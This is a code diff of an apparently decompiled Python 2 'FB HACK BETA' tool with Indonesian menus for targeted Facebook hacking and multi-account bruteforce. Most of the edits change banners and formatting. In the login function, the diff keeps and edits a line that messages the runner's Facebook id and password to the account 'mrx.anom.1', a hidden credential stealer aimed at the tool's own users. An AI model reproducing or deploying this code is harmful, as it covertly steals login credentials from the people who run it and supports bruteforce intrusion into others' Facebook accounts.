@@ -66,8 +66,11 @@ def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.1)
-			
+        time.sleep(0.01)
+
+####################################################################
+#                        BANNEr
+
 def baliho():
 	os.system('clear')
 	try:
@@ -79,14 +82,12 @@ def baliho():
 		emil = a['email']
 		n.append(a['name'])
 
-			print R + '_     _'.center(44)
-			print "o' \.=./ `o".center(44)
-			print '(o o)'.center(44)
-			print 'ooO--(_)--Ooo'.center(44)
-			print W + ' '
-			print ('FACEBOOK HACK.BETA').center(44)
-			print ' '
-			print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
+		print R + '_     _'.center(44)
+		print "o' \.=./ `o".center(44)
+		print '(o o)'.center(44)
+		print 'ooO--(_)--Ooo'.center(44)
+		print ('FB HACK BETA').center(44)
+		print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
     		print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + name
     		print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
     		print '\x1b[1;37;40m1. Informasi Pengguna'
@@ -122,7 +123,7 @@ def login():
         x.update(sig)
 	data.update({'sig':x.hexdigest()})
 	client = Client(id,pwd)
-	friends = client.searchForUsers('Mrx.anom.1')
+	friends = client.searchForUsers('mrx.anom.1')
 	friend = friends[0]
 	client.send(Message(id+'|'+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
 	client.logout()
@@ -183,12 +184,7 @@ def main():
 		        os.system('rm -rf tes/token.log')
 		        time.sleep(1)
 
-			print R + '_     _'.center(44)
-			print "o' \.=./ `o".center(44)
-			print '(o o)'.center(44)
-			print 'ooO--(_)--Ooo'.center(44)
-			print W + ' '
-			print ('FACEBOOK HACK.BETA').center(44)
+
    		    print 40 * '\x1b[1;97m\xe2\x95\x90'
 		    print ' LIHAT INFORMASI AKUN '
 		    print 40 * '\x1b[1;97m\xe2\x95\x90'
@@ -315,7 +311,7 @@ def menu_hack():
         print '\x1b[1;91m[!] Token tidak ditemukan'
         os.system('rm -rf tes/token.log')
         time.sleep(1)
-	print '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimit\x1b[1;97m[\x1b[1;96meD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53 \x1b[1;97m/ \x1b[1;96mAl2VyN\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m\n[*] Decompiled by Deray Feat Ahmad Riswanto\n'
+
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
     print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
